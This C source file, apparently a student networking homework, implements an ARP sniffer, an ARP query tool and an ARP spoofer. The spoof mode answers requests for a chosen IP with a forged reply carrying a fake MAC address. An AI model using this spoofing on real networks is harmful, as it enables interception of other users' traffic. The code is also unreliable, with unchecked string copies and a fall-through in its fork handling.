#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include "arp.h"
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <netdb.h>
#include <sys/wait.h>
#include <netinet/ip.h>
/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
#define DEVICE_NAME "enp2s0" //記得要改
#define ARP_FRAME_LEN 42

/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */

int main(int argc, char *argv[])
{
	if(geteuid() != 0){
		printf("ERROR: You must be root to use this tool\n");
		exit(1);
	}
	printf("[ARP sniffer and spoof program]\n");
	printf("### ARP sniffer mode ###\n");
	if(argc >= 2 && !strcmp(argv[1],"-help")){
		printf("Format:\n");
		printf("1) ./arp -l -a\n");
		printf("2) ./arp -l <filter_ip_address>\n");
		printf("3) ./arp -q <query_ip_address>\n");
		printf("4) ./arp <fake_mac_address> <target_ip_address>\n");
		exit(0);
	}
		// Open a recv socket in data-link layer.
	if(argc >= 3 && !strcmp(argv[1],"-l")){
		struct sockaddr_ll sa;
		struct ifreq req;
		int sockfd_recv;
		// Open a recv socket in data-link layer.
		if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
		{
			perror("open recv socket error");
			exit(1);
		}
		size_t if_name_size = strlen(DEVICE_NAME);
		if(if_name_size < sizeof(req.ifr_ifrn.ifrn_name)){
			memcpy(req.ifr_ifrn.ifrn_name,DEVICE_NAME,sizeof(DEVICE_NAME));
			req.ifr_ifrn.ifrn_name[if_name_size] = 0;
		}else{
			printf("interface name is too long\n");
		}
		if (ioctl(sockfd_recv,SIOCGIFINDEX,&req) == -1) {
			perror("ioctl error");
		}
		memset(&sa,0,sizeof(sa));
		sa.sll_family = PF_PACKET;
		sa.sll_protocol = htons(ETH_P_ARP);
		sa.sll_ifindex = req.ifr_ifru.ifru_ivalue;
		struct arp_packet ap;
		socklen_t sa_size = sizeof(sa);
		/*
		* Use recvfrom function to get packet.
		*/
		while(1){
			if(recvfrom(sockfd_recv,&ap,sizeof(ap),0,(struct sockaddr*) &sa,&sa_size) == -1){
				perror("recvfrom error");
				exit(1);
			}
			int i = 0;
			unsigned char *ptr = get_target_protocol_addr(&ap.arp);
			unsigned char *ptr1 = get_sender_protocol_addr(&ap.arp);
			unsigned char *ptr2 = get_sender_hardware_addr(&ap.arp);
			if(!strcmp(argv[2],"-a")){
				if(ntohs(ap.eth_hdr.ether_type) == ETH_P_ARP){
					printf("Get Arp packet - Who has ");
					for(; i < 4 ; i++){
						printf("%u",ptr[i]);
						if(i == 3) continue;
						printf(".");
					}
					printf("?        ");
					printf("Tell ");
					i = 0;
					for(; i < 4 ; i++){
						printf("%u",ptr1[i]);
						if(i == 3) continue;
						printf(".");
					}
					printf("\n");
				}
			}else{
				char ip[20];
				strcpy(ip,argv[2]);
				unsigned char ip_addr[4];
				char *ip_str = strtok(ip,".\n");
				int a;
				for(i = 0; i < 4 ; i++){
					a = atoi(ip_str);
					ip_addr[i] = (unsigned char) a;
					ip_str = strtok(NULL,".\n");
				}
				if(is_address_equal(ptr,ip_addr)){
					if(ntohs(ap.eth_hdr.ether_type) == ETH_P_ARP){
						printf("Get Arp packet - Who has ");
						for(i = 0 ; i < 4 ; i++){
							printf("%u",ptr[i]);
							if(i == 3) continue;
							printf(".");
						}
						printf("?        ");
						printf("Tell ");
						for(i = 0 ; i < 4 ; i++){
							printf("%u",ptr1[i]);
							if(i == 3) continue;
							printf(".");
						}
						printf("\n");
					}
				}else continue;
			}
		}
	}

	if(argc >= 3 && !strcmp(argv[1],"-q")){
		pid_t pid;
		int status;
		uint8_t *arp_frame = malloc(IP_MAXPACKET*sizeof(uint8_t));
		int sockfd_send, sockfd_recv;
		switch(pid = fork()){
			case -1:
				perror("fork error");
				exit(1);
			default:
				if((sockfd_send = socket(PF_PACKET, SOCK_RAW, ETH_P_ALL)) < 0)
				{
					perror("open send socket error");
					exit(sockfd_send);
				}
				struct sockaddr_ll sa;
				struct ifreq req;
				struct arp_header aph;
				char *success;
				memset(&req,0,sizeof(req));
				if((success = strcpy(req.ifr_ifrn.ifrn_name,DEVICE_NAME)) == NULL){
					perror("copy error");
					exit(1);
				}
				if(ioctl(sockfd_send,SIOCGIFHWADDR,&req) < 0){
					perror("ioctl error");
					exit(1);
				}
				memset(&aph,0,sizeof(aph));
				//copy source mac address to aph
				memcpy(aph.source_mac,req.ifr_ifru.ifru_hwaddr.sa_data,6*sizeof(uint8_t));
				//printf("%x %x %x %x %x %x\n",aph.source_mac[0],aph.source_mac[1],aph.source_mac[2],aph.source_mac[3],aph.source_mac[4],aph.source_mac[5]);
				//copy source ip address to aph
				memset(&req,0,sizeof(req));
				if((success = strcpy(req.ifr_ifrn.ifrn_name,DEVICE_NAME)) == NULL){
                                        perror("copy error");
                                        exit(1);
                                }
				
				if(ioctl(sockfd_send,SIOCGIFADDR,&req) < 0){
                                        perror("ioctl error");
                                        exit(1);
                                }
				char *my_ip = inet_ntoa(((struct sockaddr_in *)&req.ifr_addr)->sin_addr);//my_ip
				if(inet_pton(AF_INET,my_ip,aph.source_ip) != 1){
					perror("inet_pton error");
					exit(1);
				}
				//printf("%s\n",my_ip);
				//printf("%u %u %u %u\n",aph.source_ip[0],aph.source_ip[1],aph.source_ip[2],aph.source_ip[3]);
				//copy destination ip address to aph
				char *des_ip = argv[2];
				if(inet_pton(AF_INET,des_ip,aph.target_ip) != 1){
					perror("inet_pton error");
					exit(1);
				}
				//set broadcast address to aph
				memset(aph.target_mac,0xff,6*sizeof(uint8_t));
				//set sa
				memset(&sa,0,sizeof(sa));
				sa.sll_family = AF_PACKET;
				sa.sll_protocol = htons(ETH_P_ALL);
				sa.sll_ifindex = if_nametoindex(DEVICE_NAME);
				sa.sll_halen = 6;
				memcpy(sa.sll_addr,req.ifr_ifru.ifru_hwaddr.sa_data,6*sizeof(uint8_t));
				socklen_t sa_size = sizeof(sa);
				//set ap header
				aph.hlen = 6;
				aph.h_format = htons(1);
				aph.op = htons(ARPOP_REQUEST);
				aph.plen = 4;
				aph.p_format = htons(ETH_P_IP);
				//send arp request packet
				memcpy(arp_frame,aph.target_mac,6*sizeof(uint8_t));
				memcpy(arp_frame+6,aph.source_mac,6*sizeof(uint8_t));
				arp_frame[12] = ETH_P_ARP / 256;
				arp_frame[13] = ETH_P_ARP % 256;
				memcpy(arp_frame+14,&aph,28*sizeof(uint8_t));
				ssize_t bytes;
				int count = 1;
				while(count--){
					if((bytes = sendto(sockfd_send,arp_frame,ARP_FRAME_LEN,0,(struct sockaddr*) &sa,sa_size)) < 0){
						perror("sendto error");
						exit(1);
					}
				}
				free(arp_frame);
				close(sockfd_send);
				waitpid(pid,&status,0);
			case 0:
				//recieve arp reply packet
				if((sockfd_recv = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL))) < 0){
					perror("socket error");
					exit(1);
				}
				struct sockaddr_ll sa1;
				struct ifreq req1;
				unsigned char my_ip_addr[4];
				memset(&req1,0,sizeof(req1));
				memset(&sa1,0,sizeof(sa1));
				if(strcpy(req1.ifr_ifrn.ifrn_name,DEVICE_NAME) == NULL){
                                        perror("copy error");
                                        exit(1);
                                }

                                if(ioctl(sockfd_recv,SIOCGIFADDR,&req1) < 0){
                                        perror("ioctl error");
                                        exit(1);
                                }
				char *my_ip1 = inet_ntoa(((struct sockaddr_in *)&req1.ifr_addr)->sin_addr);//my_ip
                                if(inet_pton(AF_INET,my_ip1,my_ip_addr) != 1){
                                        perror("inet_pton error");
                                        exit(1);
                                }
				sa1.sll_family = PF_PACKET;
				sa1.sll_protocol = htons(ETH_P_ARP);
				sa1.sll_ifindex = if_nametoindex(DEVICE_NAME);
				socklen_t sa1_size = sizeof(sa1);
				struct arp_packet ap1;
				memset(&ap1,0,sizeof(ap1));
				//memset(arp_frame,0,sizeof(arp_frame));
				while(1){
					if((bytes = recvfrom(sockfd_recv,&ap1,sizeof(ap1),0,(struct sockaddr*) &sa1,&sa1_size)) < 0){
						perror("recvfrom error");
						exit(1);
					}
					unsigned char *ptr = get_target_protocol_addr(&ap1.arp);
					unsigned char *ptr1 = get_sender_hardware_addr(&ap1.arp);
					unsigned char *ptr2 = get_sender_protocol_addr(&ap1.arp);
					char ip[20];
					strcpy(ip,argv[2]);
					unsigned char ip_addr[4];
					char *ip_str = strtok(ip,".\n");
					int a,i;
					for(i = 0; i < 4 ; i++){
						a = atoi(ip_str);
						ip_addr[i] = (unsigned char) a;
						ip_str = strtok(NULL,".\n");
					}
					//unsigned char my_ip1[4] = {140,117,171,50}; //my_ip
					if(is_address_equal(ptr2,ip_addr) && is_address_equal(ptr,my_ip_addr)){
						if(ntohs(ap1.eth_hdr.ether_type) == ETH_P_ARP){
							printf("Mac address of ");
							for(i = 0 ; i < 4 ; i++){
								printf("%u",ptr2[i]);
								if(i == 3) continue;
								printf(".");
							}
							printf(" is ");
							for(i = 0 ; i < 6 ; i++){
								printf("%x",ptr1[i]);
								if(i == 5) continue;
								printf(":");
							}
							printf("\n");
						}
					}else continue;
				}
		}
	}
	else{
		struct sockaddr_ll sa;
		struct ifreq req;
		int sockfd_recv;
		uint8_t *arp_frame = malloc(IP_MAXPACKET*sizeof(uint8_t));
		// Open a recv socket in data-link layer.
		if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
		{
			perror("open recv socket error");
			exit(1);
		}
		size_t if_name_size = strlen(DEVICE_NAME);
		if(if_name_size < sizeof(req.ifr_ifrn.ifrn_name)){
			memcpy(req.ifr_ifrn.ifrn_name,DEVICE_NAME,sizeof(DEVICE_NAME));
			req.ifr_ifrn.ifrn_name[if_name_size] = 0;
		}else{
			printf("interface name is too long\n");
		}
		if (ioctl(sockfd_recv,SIOCGIFINDEX,&req) == -1) {
			perror("ioctl error");
			exit(1);
		}
		if(ioctl(sockfd_recv,SIOCGIFHWADDR,&req) < 0){
			perror("ioctl error");
			exit(1);
		}
		//建構fake reply packet
		struct arp_header aph;
		memset(&aph,0,sizeof(aph));
		int k;
		char *mac = strtok(argv[1],":");
		for(k = 0 ; k < 6 ; k++){
			u_long a = strtol(mac,NULL,16);
			aph.source_mac[k] = a;
			mac = strtok(NULL,":");
		}
		char *my_ip = argv[2];
		if(inet_pton(AF_INET,my_ip,aph.source_ip) != 1){
			perror("inet_pton error");
			exit(1);
		}
		memcpy(aph.target_mac,req.ifr_ifru.ifru_hwaddr.sa_data,6*sizeof(uint8_t));
		memset(&req,0,sizeof(req));
		if(strcpy(req.ifr_ifrn.ifrn_name,DEVICE_NAME) == NULL){
                	perror("copy error");
                        exit(1);
                }

                if(ioctl(sockfd_recv,SIOCGIFADDR,&req) < 0){
                        perror("ioctl error");
                        exit(1);
                }
                char *des_ip = inet_ntoa(((struct sockaddr_in *)&req.ifr_addr)->sin_addr);//my_ip
		if(inet_pton(AF_INET,des_ip,aph.target_ip) != 1){
			perror("inet_pton error");
			exit(1);
		}
		memset(&sa,0,sizeof(sa));
		sa.sll_family = PF_PACKET;
		sa.sll_protocol = htons(ETH_P_ARP);
		sa.sll_ifindex = req.ifr_ifru.ifru_ivalue;
		aph.hlen = 6;
		aph.h_format = htons(1);
		aph.op = htons(ARPOP_REPLY);
		aph.plen = 4;
		aph.p_format = htons(ETH_P_IP);
		//send arp reply packet
		memcpy(arp_frame,aph.target_mac,6*sizeof(uint8_t));
		memcpy(arp_frame+6,aph.source_mac,6*sizeof(uint8_t));
		arp_frame[12] = ETH_P_ARP / 256;
		arp_frame[13] = ETH_P_ARP % 256;
		memcpy(arp_frame+14,&aph,28*sizeof(uint8_t));

		struct arp_packet ap;
		socklen_t sa_size = sizeof(sa);
		while(1){
			if(recvfrom(sockfd_recv,&ap,sizeof(ap),0,(struct sockaddr*) &sa,&sa_size) == -1){
				perror("recvfrom error");
				exit(1);
			}
			int i = 0;
			unsigned char *ptr = get_target_protocol_addr(&ap.arp);
			unsigned char *ptr1 = get_sender_protocol_addr(&ap.arp);
			unsigned char *ptr2 = get_sender_hardware_addr(&ap.arp);
			char ip[20];
			strcpy(ip,argv[2]);
			unsigned char ip_addr[4];
			char *ip_str = strtok(ip,".\n");
			int a;
			for(i = 0; i < 4 ; i++){
				a = atoi(ip_str);
				ip_addr[i] = (unsigned char) a;
				ip_str = strtok(NULL,".\n");
			}
			if(is_address_equal(ptr,ip_addr) && is_address_equal(ptr1,aph.target_ip)){
				if(ntohs(ap.eth_hdr.ether_type) == ETH_P_ARP){
					printf("Get ARP packet - ");
					printf("who has %s ?         Tell %s\n",argv[2],des_ip);
					ssize_t bytes;
					int count = 1;
					while(count--){
						if((bytes = sendto(sockfd_recv,arp_frame,ARP_FRAME_LEN,0,(struct sockaddr*) &sa,sa_size)) < 0){
							perror("sendto error");
							exit(1);
						}
						else{
							printf("Send ARP Reply : %s is ",argv[2]);
							for(i = 0 ; i < 6 ; i++){
								printf("%x",aph.source_mac[i]);
								if(i == 5) continue;
								printf(":");
							}
							printf("\n");
							printf("Send successful.\n");
						}
					}
					free(arp_frame);
					close(sockfd_recv);
					break;
				}
			}else continue;
		}
	}
	return 0;
}
